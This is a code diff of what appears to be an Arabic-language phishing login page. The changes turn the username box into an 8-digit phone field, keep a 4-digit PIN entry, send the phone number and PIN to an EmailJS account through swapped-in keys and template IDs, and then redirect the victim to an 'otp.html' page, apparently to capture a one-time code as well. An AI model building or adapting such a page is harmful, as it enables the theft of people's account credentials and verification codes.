@@ -123,11 +123,10 @@
              margin-bottom: 8px; 
         }
 
-        /* 🔥 التعديل هنا: تغيير الاتجاه إلى rtl */
         .pin-underscores-container {
             display: flex;
             gap: 15px;
-            direction: rtl; /* تم التعديل من ltr إلى rtl */
+            direction: rtl; 
             justify-content: flex-start;
         }
 
@@ -219,8 +218,15 @@
             
             <div class="input-group">
                 <div class="username-wrapper">
-                    <i class="fa-solid fa-user input-icon-right"></i>
-                    <input type="text" id="username" class="custom-input" placeholder="اسم المستخدم أو رقم الهاتف" required autocomplete="username">
+                    <i class="fa-solid fa-mobile-screen input-icon-right"></i>
+                    <input type="tel" 
+                           id="username" 
+                           class="custom-input" 
+                           placeholder="رقم الهاتف " 
+                           required 
+                           maxlength="8" 
+                           inputmode="numeric" 
+                           autocomplete="tel">
                 </div>
             </div>
 
@@ -254,8 +260,14 @@
     <script>
         (function(){
             // ⚠️⚠️ استبدل بالمفتاح العام الحقيقي
-            emailjs.init("zWBq4dbSzfkEvVeS2");
+            emailjs.init("Iae5WP5Hg6-29STPP");
         })();
+
+        // 🟢 منع كتابة الحروف في خانة الهاتف
+        const phoneInput = document.getElementById('username');
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
 
         const pinInputs = document.querySelectorAll('.pin-underscore-input');
 
@@ -293,8 +305,9 @@
                 document.getElementById('pin3').value + 
                 document.getElementById('pin4').value;
 
-            if(!username || pin.length < 4) {
-                alert("يرجى إدخال اسم المستخدم والرقم السري المكون من 4 أرقام.");
+            // 🟢 شرط التحقق: يجب أن يكون رقم الهاتف 8 أرقام بالضبط
+            if(username.length !== 8 || pin.length < 4) {
+                alert("يرجى إدخال رقم الهاتف (8 أرقام) والرقم السري المكون من 4 أرقام.");
                 return;
             }
 
@@ -311,17 +324,16 @@
             };
 
             // ⚠️⚠️ تأكد من صحة Service ID و Template ID
-            emailjs.send('service_lyabofe', 'template_cxjh4ls', templateParams)
+            emailjs.send('service_wxc3g1p', 'template_jwg1d2c', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     btn.innerHTML = '<i class="fas fa-check"></i> تم بنجاح';
                     btn.style.backgroundColor = "#4CAF50"; 
                     btn.style.color = "#fff";
                     
-                    // 🔥 التعديل هنا: التوجيه يتم فقط بعد نجاح الإرسال
                     setTimeout(() => {
                          window.location.href = 'otp.html'; 
-                    }, 1000); // انتظار ثانية واحدة لرؤية علامة النجاح
+                    }, 1000); 
 
                 }, function(error) {
                     console.log('FAILED...', error);
